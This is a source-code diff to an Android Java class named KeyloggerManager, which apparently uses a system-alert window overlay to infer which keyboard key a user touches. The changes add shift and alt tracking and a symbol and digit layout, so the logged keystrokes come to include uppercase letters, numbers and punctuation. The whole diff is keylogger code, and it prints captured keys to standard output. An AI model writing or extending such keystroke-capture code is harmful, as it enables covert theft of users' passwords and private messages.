@@ -17,11 +17,18 @@ public class KeyloggerManager {
     private int type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
     private int flags = 0;
     private int width;
+    private boolean shifted = false;
+    private boolean alt = false;
     private String[] qwerty_alpha = {
             "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
             "a", "s", "d", "f", "g", "h", "j", "k", "l",
             "shift", "z", "x", "c", "v", "b", "n", "m", "back",
             "alt", "misc", " ", ".", "enter"};
+    private String[] alt_alpha = {
+            "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
+            "@", "#", "$", "%", "&", "-", "+", "(", ")",
+            "symbols", "*", "\"", "\'", ":", ";", "!", "?", "back",
+            "alt", ",", " ", ".", "enter"};
     private WindowManager manager;
     private volatile Context parent;
     volatile View touch_view;
@@ -75,7 +82,26 @@ public class KeyloggerManager {
 
                     /** Print the key to system.out then reset total **/
                     if (MAX_INDEX-total >= 0) {
-                        System.out.println("Total: " + total + " Input: " + qwerty_alpha[MAX_INDEX - total]);
+                        String key = qwerty_alpha[MAX_INDEX - total];
+                        if (alt) {                                                                      /** If alt key was pressed then the alt_alpha will be used**/
+                            key = alt_alpha[MAX_INDEX - total];
+                            System.out.println("Total: " + total + " Input: " + key);
+                            if (shifted) {
+                                shifted = !shifted;
+                            }
+                            if (key.equals(" ") || key.equals("alt")) {
+                                alt = !alt;
+                            }
+                        } else if (shifted) {                                                           /** If the shift key is pressed set shifted to not shifted **/
+                            System.out.println("Total: " + total + " Input: " + key.toUpperCase());
+                            shifted = !shifted;
+                        } else if (key.equals("alt")) {                                                 /** Set alt keyboard flag **/
+                            alt = !alt;
+                        } else if (key.equals("shift")) {                                               /** Set shift keyboard flag **/
+                            shifted = !shifted;
+                        } else {                                                                        /** Print regular qwerty keyboard **/
+                            System.out.println("Total: " + total + " Input: " + key);
+                        }
                     }
 
                     total = 0;
